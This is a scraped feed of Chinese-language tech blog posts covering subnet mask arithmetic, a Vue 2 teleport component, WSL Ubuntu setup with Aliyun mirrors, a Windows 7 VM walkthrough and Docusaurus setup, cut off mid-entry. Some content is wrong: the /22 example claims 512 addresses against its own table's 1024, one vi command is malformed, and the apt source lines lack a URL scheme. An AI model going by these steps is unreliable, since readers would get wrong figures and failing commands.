        <content type="html"><![CDATA[<h1 id="子网掩码、前缀长度、IP地址数的换算"><a href="#子网掩码、前缀长度、IP地址数的换算" class="headerlink" title="子网掩码、前缀长度、IP地址数的换算"></a>子网掩码、前缀长度、IP地址数的换算</h1><h2 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h2><blockquote><p>子网掩码只有一个功能，就是将IP地址划分为网络地址和主机地址两部分。 如同现实生活中的通讯地址，可以看作省市部分和具体门牌号部分。相同的IP地址，但掩码不一样，则指向的网络部分和主机部分不一样。子网掩码用来判断任意两台计算机的IP地址是否在同一个子网中的根据。如果相同，说明两台计算机在同一个子网中，可以直接通讯；</p></blockquote><ol><li>按照TCP&#x2F;IP协议规定，IP地址用二进制来表示，每个IP地址长32bit，比特换算成字节，就是4个字节；</li><li>子网掩码的长度也是32位，左边是网络位，用二进制数字“1”表示；右边是主机位，用二进制数字“0”表示；</li><li>子网掩码常用两种表示形式，一种是 <code>点分十进制表示法</code>，如： 255.255.255.0；另一种是用 <code>前缀长度</code> 表示，如： 24；</li><li>子网掩码不能单独存在，它必须结合IP地址一起使用；</li><li>子网掩码只有一个作用，就是将某个IP地址划分成网络地址和主机地址两部分；</li></ol><h2 id="子网掩码计算"><a href="#子网掩码计算" class="headerlink" title="子网掩码计算"></a>子网掩码计算</h2><p>子网掩码和前缀长度的换算:</p><ul><li><p>case 1</p><blockquote><p>255.255.255.0 –&gt; 11111111 11111111 11111111 00000000</p></blockquote><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">网络号： 24</span><br><span class="line">主机号： 8</span><br><span class="line">ip个数： 256</span><br></pre></td></tr></table></figure><p>子网掩码“255.255.255.0”的前缀长度为： 24；<br>后面一个数字可以在0~255范围内任意变化，因此可以提供256个IP地址。但是实际可用的IP地址数量是256-2，即254个，因为主机号不能全是“0”或全是“1”。</p></li><li><p>case 2</p><blockquote><p>255.255.0.0 –&gt; 11111111 11111111 00000000 00000000</p></blockquote><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">网络号： 16</span><br><span class="line">主机号： 16</span><br><span class="line">ip个数： 256² = 65536</span><br></pre></td></tr></table></figure><p>子网掩码“255.255.0.0”的前缀长度为： 16；<br>后面两个数字可以在0~255范围内任意变化，可以提供 256² 个IP地址。但是实际可用的IP地址数量是256²-2，即65534个。</p></li><li><p>case 3</p><blockquote><p>255.255.252.0 –&gt; 11111111 11111111 11111100 00000000</p></blockquote><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">网络号： 22</span><br><span class="line">主机号： 10</span><br><span class="line">ip个数： 256 <span class="emphasis">* 2 = 512</span></span><br></pre></td></tr></table></figure><p>子网掩码“255.255.252.0”的前缀长度为： 22；<br>可以提供 512 个IP地址。但是实际可用的IP地址数量是512 -2，即510个。</p></li></ul><p>…</p><p><a href="https://www.cnblogs.com/librarookie/p/14778002.html" title="二进制、八进制、十进制和十六进制的相互转化（图解）">十进制和二进制的相互转换传送</a></p><p>不想计算的小伙伴可以参考下表</p><h2 id="子网掩码与ip个数对照表"><a href="#子网掩码与ip个数对照表" class="headerlink" title="子网掩码与ip个数对照表"></a>子网掩码与ip个数对照表</h2><p>来源： <a href="https://blog.csdn.net/xbin1981/article/details/79580080">https://blog.csdn.net/xbin1981/article/details/79580080</a></p><table><thead><tr><th>子网掩码</th><th>网络号&#x2F;位</th><th>IP数</th></tr></thead><tbody><tr><td>255.255.255.255</td><td>32</td><td>1</td></tr><tr><td>255.255.255.254</td><td>31</td><td>2</td></tr><tr><td>255.255.255.252</td><td>30</td><td>4</td></tr><tr><td>255.255.255.248</td><td>29</td><td>8</td></tr><tr><td>255.255.255.240</td><td>28</td><td>16</td></tr><tr><td>255.255.255.224</td><td>27</td><td>32</td></tr><tr><td>255.255.255.192</td><td>26</td><td>64</td></tr><tr><td>255.255.255.128</td><td>25</td><td>128</td></tr><tr><td>255.255.255.0</td><td>24</td><td>256</td></tr><tr><td>255.255.254.0</td><td>23</td><td>512</td></tr><tr><td>255.255.252.0</td><td>22</td><td>1024</td></tr><tr><td>255.255.248.0</td><td>21</td><td>2048</td></tr><tr><td>255.255.240.0</td><td>20</td><td>4096</td></tr><tr><td>255.255.224.0</td><td>19</td><td>8192</td></tr><tr><td>255.255.192.0</td><td>18</td><td>16384</td></tr><tr><td>255.255.128.0</td><td>17</td><td>32768</td></tr><tr><td>255.255.0.0</td><td>16</td><td>65536</td></tr><tr><td>255.254.0.0</td><td>15</td><td>131072</td></tr><tr><td>255.252.0.0</td><td>14</td><td>262144</td></tr><tr><td>255.248.0.0</td><td>13</td><td>524288</td></tr><tr><td>255.240.0.0</td><td>12</td><td>1048576</td></tr><tr><td>255.224.0.0</td><td>11</td><td>2097152</td></tr><tr><td>255.192.0.0</td><td>10</td><td>4194304</td></tr><tr><td>255.128.0.0</td><td>9</td><td>8388608</td></tr><tr><td>255.0.0.0</td><td>8</td><td>16777216</td></tr><tr><td>254.0.0.0</td><td>7</td><td>33554432</td></tr><tr><td>252.0.0.0</td><td>6</td><td>67108864</td></tr><tr><td>248.0.0.0</td><td>5</td><td>134217728</td></tr><tr><td>240.0.0.0</td><td>4</td><td>268435456</td></tr><tr><td>224.0.0.0</td><td>3</td><td>536870912</td></tr><tr><td>192.0.0.0</td><td>2</td><td>1073741824</td></tr><tr><td>128.0.0.0</td><td>1</td><td>2147483648</td></tr><tr><td>0.0.0.0</td><td>0</td><td>4294967296</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 长度 </tag>
            
            <tag> 地址 </tag>
            
            <tag> 个数 </tag>
            
            <tag> 子网掩码 </tag>
            
            <tag> 255.255.255.0 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue2 如何实现将dom元素转移到指定节点</title>
      <link href="/posts/c35f6258326a/"/>
      <url>/posts/c35f6258326a/</url>
      
        <content type="html"><![CDATA[<h3 id="背景：在写商城页面时，PC端给的设计图纸是按照宽度1920给的，内部内容区域（main）1191px，写死的指定宽度。然后新出了一个页面，类似于12306的这个页面，图片部分，直接占满了屏幕的100vw，内部div的宽度，超出了外部的，因此想到了vue3新出的teleport，vue2如何实现这个功能"><a href="#背景：在写商城页面时，PC端给的设计图纸是按照宽度1920给的，内部内容区域（main）1191px，写死的指定宽度。然后新出了一个页面，类似于12306的这个页面，图片部分，直接占满了屏幕的100vw，内部div的宽度，超出了外部的，因此想到了vue3新出的teleport，vue2如何实现这个功能" class="headerlink" title="背景：在写商城页面时，PC端给的设计图纸是按照宽度1920给的，内部内容区域（main）1191px，写死的指定宽度。然后新出了一个页面，类似于12306的这个页面，图片部分，直接占满了屏幕的100vw，内部div的宽度，超出了外部的，因此想到了vue3新出的teleport，vue2如何实现这个功能"></a>背景：在写商城页面时，PC端给的设计图纸是按照宽度1920给的，内部内容区域（main）1191px，写死的指定宽度。然后新出了一个页面，类似于12306的这个页面，图片部分，直接占满了屏幕的100vw，内部div的宽度，超出了外部的，因此想到了vue3新出的teleport，vue2如何实现这个功能</h3><p><img src="https://static.luozhinet.com/cf/e068e674409d16e61d86bcd1b2af84"><br>新建一个teleport组件</p><p>点击查看代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">name: &#x27;teleport&#x27;,</span><br><span class="line">props: &#123;</span><br><span class="line">/* 移动至哪个标签内，最好使用id */</span><br><span class="line">to: &#123;</span><br><span class="line">type: String,</span><br><span class="line">required: true</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">mounted() &#123;</span><br><span class="line">document.querySelector(this.to).appendChild(this.$el)</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">destroyed() &#123;</span><br><span class="line">document.querySelector(this.to).removeChild(this.$el)</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">render() &#123;</span><br><span class="line">return &lt;div&gt;&#123;this.$scopedSlots.default()&#125;&lt;/div&gt;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>从使用页面引入组件 点击查看代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;logisticsInfo&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;title-box&quot;&gt;</span><br><span class="line">      &lt;teleport to=&quot;#header__center&quot;&gt; &lt;img src=&quot;https://www.cnblogs.com/mengqc1995/assets/logisticsInfoImgs/bg-title.png&quot;</span><br><span class="line">             alt=&quot;&quot;</span><br><span class="line">             class=&quot;bg-box&quot;&gt;&lt;/teleport&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">import teleport from &#x27;./components/teleport.vue&#x27;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#x27;QsMallWebLogisticsInfo&#x27;,</span><br><span class="line">  components: &#123;</span><br><span class="line">    teleport,</span><br><span class="line">  &#125;,</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  mounted() &#123;&#125;,</span><br><span class="line"></span><br><span class="line">  methods: &#123;&#125;,</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;style lang=&quot;scss&quot; scoped&gt;</span><br><span class="line">.logisticsInfo &#123;</span><br><span class="line">  .title-box &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;style lang=&quot;scss&quot;&gt;</span><br><span class="line">#header__center &#123;</span><br><span class="line">  .bg-box &#123;</span><br><span class="line">    height: 458px;</span><br><span class="line">    width: 100%;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>注意样式不要写在使用属性里 指定转移的节点，通过id的方式，进行绑定 点击查看代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;header__center&quot;&gt;&lt;/div&gt;</span><br><span class="line">   &lt;div class=&quot;main&quot;&gt;</span><br><span class="line">     &lt;router-view ref=&quot;mallPage&quot;&gt;&lt;/router-view&gt;</span><br><span class="line">   &lt;/div&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> auto </tag>
            
            <tag> 标签 </tag>
            
            <tag> import </tag>
            
            <tag> default </tag>
            
            <tag> teleport </tag>
            
            <tag> export </tag>
            
            <tag> mounted </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>超详细：如何在windous系统下使用wsl虚拟机安装Ubuntu</title>
      <link href="/posts/4233dd1ac4c0/"/>
      <url>/posts/4233dd1ac4c0/</url>
      
        <content type="html"><![CDATA[<p><img src="https://static.luozhinet.com/fe/efe4b659cbc23e7d5bdc1bb8d64d96" alt="file"></p><p>镜像下载、域名解析、时间同步请点击 <a href="https://developer.aliyun.com/mirror/?utm_content=g_1000303593">阿里云开源镜像站</a></p><p><strong>前情提要：</strong> 该方法只适用于Windows10以上版本，Ubuntu直接可在微软商店安装</p><p>在这个网页<a href="https://docs.microsoft.com/zh-cn/windows/wsl/install-manual">docs.microsoft.com&#x2F;zh-cn&#x2F;windo…</a> 可以设置完成前5部，然后根据下面具体操作。</p><blockquote><p>ps：1.在连接中我们要打开powershell，一定要以管理员方式运行</p><p>2. 在第4部，有安装wsl2的链接</p><p>3. 在第5部，将wsl2设为默认版本</p></blockquote><h2 id="在wsl虚拟机安装ubuntu"><a href="#在wsl虚拟机安装ubuntu" class="headerlink" title="在wsl虚拟机安装ubuntu"></a>在wsl虚拟机安装ubuntu</h2><p>1.在控制面板中进行如下操作，打开Windows系统提供的WSL服务。</p><ul><li>打开控制面板，查看方式为类别；</li><li>点开程序，点击启动或关闭windows功能；</li></ul><p><img src="https://static.luozhinet.com/f9/a7c9703ece297fcbd887e1bc71d075" alt="file"></p><ul><li>将虚拟机平台和适用于Linux的windows子系统勾选，进行重启</li></ul><p><img src="https://static.luozhinet.com/f0/02ccd83dc00eb4b8851fcdf7259033" alt="file"></p><ul><li>后面我们进去下列网址，根据操作，在powershell里一定以管理员是身份打开，下面我就不操作了，里面很详细。(我们看到下载wsl2后下载，安装后进行下列操作）</li></ul><ol start="2"><li>从开始菜单中，找到微软商店：</li></ol><p><img src="https://static.luozhinet.com/e1/1a5a0c352b4b522f1cfe873e0acb29" alt="file"></p><p>3. 从微软应用商店中，选择Ubuntu20.04版本下载安装：</p><p><img src="https://static.luozhinet.com/ae/57303ad2980c4b1e59e06cdb1ad4e3" alt="file"></p><p>4. 随后会出现Ubuntu系统安装界面：</p><p><img src="https://static.luozhinet.com/61/301331f3a989a752e186dfba408f33" alt="file"></p><p>等待几分钟后，设置用户名username和密码password</p><p><img src="https://static.luozhinet.com/ac/80e8ab0baf3e634c90bf2f7e29b031" alt="file"></p><p>最终界面上出现 $ 提示符，说明已经安装好，可以使用了：</p><p><img src="https://static.luozhinet.com/c7/a6503e8bc890dc2b77b4bbfe307cbf" alt="file"></p><h2 id="修改为阿里镜像源"><a href="#修改为阿里镜像源" class="headerlink" title="修改为阿里镜像源"></a>修改为阿里镜像源</h2><p>修改软件镜像源为阿里云镜像源。通常从软件镜像源下载需要在Ubuntu操作系统上安装的软件。将软件镜像源切换为阿里云镜像源，是因为访问国内的镜像源下载软件更快更流畅。</p><p>修改软件镜像源为阿里云镜像源参考如下文章：<a href="https://link.juejin.cn/?target=http://www.mimiq.com.cn/?p=563" title="http://www.mimiq.com.cn/?p=563">DeepOps的ubuntu小笔记-ubuntu20.04lts更换阿里云的源 – Deep小站 by DOps (mimiq.com.cn)</a></p><p>注：(此步需要使用vi编辑器相关操作，建议先熟悉vi编辑器相关操作)</p><h4 id="下列是具体步骤："><a href="#下列是具体步骤：" class="headerlink" title="下列是具体步骤："></a>下列是具体步骤：</h4><h4 id="1-sudo-cp-etc-apt-sources-list-etc-apt-sources-list-bak"><a href="#1-sudo-cp-etc-apt-sources-list-etc-apt-sources-list-bak" class="headerlink" title="1.sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak"></a>1.<code>sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</code></h4><h4 id="2-sudo-vi-cp-etc-apt-sources-list"><a href="#2-sudo-vi-cp-etc-apt-sources-list" class="headerlink" title="2. sudo vi cp /etc/apt/sources.list"></a>2. <code>sudo vi cp /etc/apt/sources.list</code></h4><p>按a 然后下面变insert模式（开发者模式）</p><h4 id="3-把下列网址全部复制到vi编译器里"><a href="#3-把下列网址全部复制到vi编译器里" class="headerlink" title="3.把下列网址全部复制到vi编译器里"></a>3.把下列网址全部复制到vi编译器里</h4><blockquote><p>ps：当时vi编译器界面应为没有任何内容（如果有，按d键删除，然后在进行下列操作）</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb-src mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb-src mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb-src mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb-src mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb-src mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure><p>然后esc</p><p>然后输入：wq</p><p>回车，就会回到Ubuntu操作界面</p><blockquote><p>Ps： 如果想检查网址是否都录入在vi编译器里输入：cat &#x2F;etc&#x2F;apt&#x2F;sources.list</p></blockquote><p><img src="https://static.luozhinet.com/3b/58ae8dd0a180a971694d9dbfb51241" alt="file"></p><h4 id="4-更新源"><a href="#4-更新源" class="headerlink" title="4.更新源"></a>4.更新源</h4><p>sudo apt update</p><p><img src="https://static.luozhinet.com/a0/f3d6e5a19ed0a9653238c307d6c6a0" alt="file"></p><p>sudo apt-get upgrade</p><p><img src="https://static.luozhinet.com/9b/d11d1242179ada0f086d69bc7f8aab" alt="file"></p><h4 id="5-安装编译器"><a href="#5-安装编译器" class="headerlink" title="5.安装编译器"></a>5.安装编译器</h4><p>软件镜像源修改完成后，就可以在Ubuntu上安装gcc和g++编译器，以及gdb调试器。</p><p>在命令行执行如下命令：<code>sudo apt install gcc g++ gdb</code></p><p>安装完成后，可以使用gcc -v命令查询gcc编译器的版本号，如果可以查询出来，说明安装成功。（如下图）</p><p><img src="https://static.luozhinet.com/30/c93834c375eadf792c7bf1da470d18" alt="file"></p><p>本文转自：<a href="https://juejin.cn/post/7096326403485859848#heading-6">https://juejin.cn/post/7096326403485859848#heading-6</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作 </tag>
            
            <tag> 密码 </tag>
            
            <tag> 应用 </tag>
            
            <tag> 服务 </tag>
            
            <tag> 方法 </tag>
            
            <tag> 域名 </tag>
            
            <tag> auto </tag>
            
            <tag> file </tag>
            
            <tag> 镜像 </tag>
            
            <tag> 修改 </tag>
            
            <tag> username </tag>
            
            <tag> multiverse </tag>
            
            <tag> restricted </tag>
            
            <tag> universe </tag>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>创建Windows 7虚拟机（workstation工具）</title>
      <link href="/posts/e49415651ef4/"/>
      <url>/posts/e49415651ef4/</url>
      
        <content type="html"><![CDATA[<p>目录</p><ul><li>window 7 x64镜像下载地址</li><li>创建步骤（详细）</li></ul><hr><h1 id="window-7-x64镜像下载地址"><a href="#window-7-x64镜像下载地址" class="headerlink" title="window 7 x64镜像下载地址"></a>window 7 x64镜像下载地址</h1><p>百度网盘：</p><ul><li>链接：<a href="https://pan.baidu.com/s/1KpA0KS4QDD3WKiFuRk-YBQ">https://pan.baidu.com/s/1KpA0KS4QDD3WKiFuRk-YBQ</a></li><li>提取码：wch3</li></ul><h1 id="创建步骤（详细）"><a href="#创建步骤（详细）" class="headerlink" title="创建步骤（详细）"></a>创建步骤（详细）</h1><p>1.打开workstation 工具（这里是16pro版），单击”主页”中的“创建新的虚拟机”。<br><img src="https://static.luozhinet.com/11/7de40d1823bcebcbfe407afd6f4a56" alt="image"><br>2.这里我们勾选“自定义”，然后“下一步”。<br><img src="https://static.luozhinet.com/4f/fc50bb725f2f3d67901d8a754e9db5" alt="image"><br>3.这里选择workstation 12x，下一步。<br><img src="https://static.luozhinet.com/00/7045ff71a4f8a790e3ae308f8b55b4" alt="image"><br>4.勾选“稍后安装操作系统”，下一步。<br><img src="https://static.luozhinet.com/27/d2c84cab274aa0568e9b31cd7873d9" alt="image"><br>5.这里客户机操作系统选择Microsoft Windows，版本选择Windows 7 x64。<br><img src="https://static.luozhinet.com/cc/6a469040f9f7e193640e47e39840fc" alt="image"><br>6.这里虚拟机名称可以根据个人喜好随意设置，位置可以参考下图。<br><img src="https://static.luozhinet.com/fd/6c56793e076ea85816bc391367a169" alt="image"><br>7.这里固件类型选择BISO。<br><img src="https://static.luozhinet.com/c9/e0485407cdab2155a2b52cd92ea163" alt="image"><br>8.这里安装个人喜好设置，也可按下图所示设置。<br><img src="https://static.luozhinet.com/5c/50d9fb74fb3fa43dc7a671020a7d65" alt="image"><br>9.这里不做调整，默认2048MB，下一步。<br><img src="https://static.luozhinet.com/22/eae8eb660e3709f5a64da01e541cce" alt="image"><br>10.默认选择使用网络地址转换，下一步。<br><img src="https://static.luozhinet.com/d5/df2940ff7c6bc14354e056dc030349" alt="image"><br>11.这里不做设置，默认选择LSI logic SAS，下一步。<br><img src="https://static.luozhinet.com/16/ecb554684bf708efa951b55dc0490e" alt="image"><br>12.默认选择推荐（SCSI），下一步。<br><img src="https://static.luozhinet.com/7f/78f769241b00235b2f801300a01891" alt="image"><br>13.勾选创建新虚拟机磁盘，下一步。<br><img src="https://static.luozhinet.com/c9/a5a8c0495ccc42dc13ced1feff79fc" alt="image"><br>14.默认，不做调整，下一步。<br><img src="https://static.luozhinet.com/78/2bee71f669e4bcf61eb326f5a827f5" alt="image"><br>15.默认，下一步。<br><img src="https://static.luozhinet.com/ec/62f964a2e80f7a741711778bf7ac4a" alt="image"><br>16.单击自定义硬件。<br><img src="https://static.luozhinet.com/81/43cdc5d165daa7ee49c71608f9bc47" alt="image"><br>17.选择设备中的打印机，然后单击移除。<br><img src="https://static.luozhinet.com/b2/45d021bb4b9e113e385d4b1e4630f7" alt="image"><br>18.选择新CD&#x2F;DVD(SATA)，再选择连接中的使用ISO映像文件，将Windows 7的镜像文件路径导入，然后关闭。<br><img src="https://static.luozhinet.com/70/7a75c3f7923010842528d5bc0b54cb" alt="image"><br>19，单击完成，虚拟机就创建成功了。<br><img src="https://static.luozhinet.com/c7/d87d1fa1632b3310556937a32bd7a7" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网盘 </tag>
            
            <tag> 文件 </tag>
            
            <tag> 目录 </tag>
            
            <tag> 创建 </tag>
            
            <tag> 客户 </tag>
            
            <tag> 镜像 </tag>
            
            <tag> 地址 </tag>
            
            <tag> image </tag>
            
            <tag> 默认 </tag>
            
            <tag> 单击 </tag>
            
            <tag> x64 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5分钟站点生成神器——Docusaurus</title>
      <link href="/posts/304408dfc52f/"/>
      <url>/posts/304408dfc52f/</url>
      
        <content type="html"><![CDATA[<h2 id="为什么要使用Docusaurus"><a href="#为什么要使用Docusaurus" class="headerlink" title="为什么要使用Docusaurus"></a>为什么要使用Docusaurus</h2><p>Docusaurus 是 Facebook 专门为开源项目开发者提供的一款易于维护的静态网站创建工具，使用 Markdown 即可更新网站。构建一个带有主页、文档、API、帮助以及博客页面的静态网站，只需5分钟。</p><p>Docusaurus 是一个静态站点生成器。它构建了一个具有快速客户端导航的单页应用程序，利用React的全部功能使您的站点具有交互性。它提供开箱即用的文档功能，但可用于创建任何类型的网站（个人网站、产品、博客、营销登录页面等）。</p><blockquote><p>通过本教程中，你将从头开始构建自己的应用，分别使用Docusaurus CLI 和 云开发平台</p></blockquote><h2 id="Docusaurus-CLI-快速搭建项目"><a href="#Docusaurus-CLI-快速搭建项目" class="headerlink" title="Docusaurus-CLI 快速搭建项目"></a>Docusaurus-CLI 快速搭建项目</h2><h3 id="一、搭建本地开发环境"><a href="#一、搭建本地开发环境" class="headerlink" title="一、搭建本地开发环境"></a>一、搭建本地开发环境</h3><ul><li><p>Docusaurus 需要 Node.js版本 &gt;&#x3D; 14 或以上（可以通过运行检查node -v）。您可以使用nvm在安装的单台机器上管理多个 Node 版本。安装 Node.js 时，建议您选中所有与依赖项相关的复选框。</p></li><li><p>npm 包管理器 因为我们通常都会使用Docusaurus 提供的脚手架搭建项目结构，所以要下载并安装 npm 包。本指南使用 npm 客户端命令行界面，该界面默认安装在 Node.js。要检查你是否安装了 npm 客户端，请在终端窗口中运行 npm -v 。</p></li><li><p>Docusaurus 本质上是一组 npm包。</p></li></ul><h3 id="二、创建新的初始应用"><a href="#二、创建新的初始应用" class="headerlink" title="二、创建新的初始应用"></a>二、创建新的初始应用</h3><ul><li>安装 Docusaurus 最简单的方法是使用命令行工具来帮助您搭建 Docusaurus 骨架网站。您可以在新的空存储库或现有存储库中的任何位置运行此命令，它将创建一个包含脚手架文件的新目录。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx create-docusaurus@latest my-website classic</span><br></pre></td></tr></table></figure><ul><li>新建完成后，指定文件夹的目录如下：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">my-website</span><br><span class="line">├── blog</span><br><span class="line">│   ├── 2019-05-28-hola.md</span><br><span class="line">│   ├── 2019-05-29-hello-world.md</span><br><span class="line">│   └── 2020-05-30-welcome.md</span><br><span class="line">├── docs</span><br><span class="line">│   ├── doc1.md</span><br><span class="line">│   ├── doc2.md</span><br><span class="line">│   ├── doc3.md</span><br><span class="line">│   └── mdx.md</span><br><span class="line">├── src</span><br><span class="line">│   ├── css</span><br><span class="line">│   │   └── custom.css</span><br><span class="line">│   └── pages</span><br><span class="line">│       ├── styles.module.css</span><br><span class="line">│       └── index.js</span><br><span class="line">├── static</span><br><span class="line">│   └── img</span><br><span class="line">├── docusaurus.config.js</span><br><span class="line">├── package.json</span><br><span class="line">├── README.md</span><br><span class="line">├── sidebars.js</span><br><span class="line">└── yarn.lock</span><br></pre></td></tr></table></figure><h3 id="三、启动应用服务器"><a href="#三、启动应用服务器" class="headerlink" title="三、启动应用服务器"></a>三、启动应用服务器</h3><p>进入工作区目录，并启动这个应用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd my-website</span><br><span class="line">npm run start</span><br></pre></td></tr></table></figure><p>npm run start 命令会构建本应用、启动开发服务器、监听源文件，并且当那些文件发生变化时重新构建本应用，</p><p>也会打开浏览器，并访问 <a href="http://localhost:3000/">http://localhost:3000/</a> 。</p><p>你会发现本应用正运行在浏览器中。</p><p>参考文献：<a href="https://docusaurus.io/">https://docusaurus.io/</a></p><h2 id="云平台一键部署Docusaurus"><a href="#云平台一键部署Docusaurus" class="headerlink" title="云平台一键部署Docusaurus"></a>云平台一键部署Docusaurus</h2><h3 id="一、创建环境"><a href="#一、创建环境" class="headerlink" title="一、创建环境"></a>一、创建环境</h3><p>想要一键部署Docusaurus，需要以下账号和服务：</p><ul><li>Github账号 (<a href="https://github.com/">https://github.com/</a>)，</li><li>阿里云账号，并使用阿里云账号登录云开发平台 (<a href="https://workbench.aliyun.com/">https://workbench.aliyun.com/</a>)，为保证最好的使用体验，请使用Chrome浏览器。开通OSS服务。</li><li>未开通阿里云OSS的用户，点击链接 (<a href="https://workbench.aliyun.com/product/open?code=oss">https://workbench.aliyun.com/product/open?code=oss</a>)开通OSS服务。OSS开通免费，有一定的免费额度，超过额度之后按量付费。</li></ul><p><img src="https://static.luozhinet.com/15/77ea2ad6599518f5eb6f9209a988d9" alt="file"></p><h3 id="二、创建Docusaurus应用"><a href="#二、创建Docusaurus应用" class="headerlink" 